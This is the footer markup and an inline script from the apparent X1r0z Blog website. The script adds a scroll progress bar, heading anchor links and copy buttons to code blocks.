GitHub</span> </a><a href="https://x.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on X"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg> <span class="sr-only">X1r0z Blog on X</span> </a><a href="https://www.linkedin.com/in/x1r0z/" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on LinkedIn"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg> <span class="sr-only">X1r0z Blog on LinkedIn</span> </a><a href="mailto:i@exp10it.io" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to X1r0z Blog"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to X1r0z Blog</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2026</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      // Check if --file-name-offset custom property exists
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      // Determine the top positioning class
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
